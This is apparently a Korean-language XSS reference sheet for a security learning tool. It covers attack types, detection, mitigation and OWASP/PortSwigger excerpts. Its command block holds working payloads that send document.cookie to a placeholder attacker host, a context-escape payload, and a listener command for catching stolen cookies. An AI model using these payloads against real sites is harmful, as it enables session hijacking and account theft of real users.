# 학습 시드(심화): xss

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn xss`. P1: 머신별 라이트업 미참조.

## 개요
크로스사이트 스크립팅: 공격자 스크립트가 피해자 브라우저에서 실행. 세션탈취·키로깅·피싱. CWE-79.

## 핵심 기법 · 열거
- Reflected: 요청 파라미터가 즉시 응답에 반영
- Stored: 서버 저장 후 다수 피해자에 전달(가장 위험)
- DOM-based: 클라이언트 JS 의 안전하지 않은 sink(innerHTML·eval)
- 컨텍스트별 페이로드(HTML/속성/JS/URL)·필터 우회(이벤트핸들러·인코딩)
- 활용: document.cookie 반출·CSRF 토큰 탈취·BeEF 훅·관리자 세션

## 표준 도구 · 명령
```
<script>new Image().src='http://<lhost>/c='+document.cookie</script>
<img src=x onerror=fetch('http://<lhost>/'+document.cookie)>
'"><svg onload=alert(document.domain)>           # 컨텍스트 탈출
python3 -m http.server 80                          # 쿠키 수신
```

## 블루팀 탐지
응답에 반영되는 <script>·onerror·onload. CSP 위반 리포트. 비정상 아웃바운드(쿠키 유출) 요청.

## 완화
출력 인코딩(컨텍스트별)·CSP(nonce)·HttpOnly 쿠키·입력 검증·프레임워크 자동 이스케이프.

- 출처(검증): https://owasp.org/www-community/attacks/xss/

## 최신 보강(승격)

> `assassin --promote` 품질 관문을 통과한 권위 출처 발췌. 수정·삭제는 PR 리뷰로. 사람이 다듬은 위 섹션이 우선한다.

### OWASP XSS
- 출처: https://owasp.org/www-community/attacks/xss/
- 승격일: 2026-10-07
- 요약: Cross Site Scripting (XSS) Overview Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without val

### PortSwigger XSS
- 출처: https://portswigger.net/web-security/cross-site-scripting
- 승격일: 2026-10-07
- 요약: Cross-site scripting In this section, we'll explain what cross-site scripting is, describe the different varieties of cross-site scripting vulnerabilities, and spell out how to find and prevent cross-site scripting. What is cross-site scripting (XSS)? Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy, which is desi
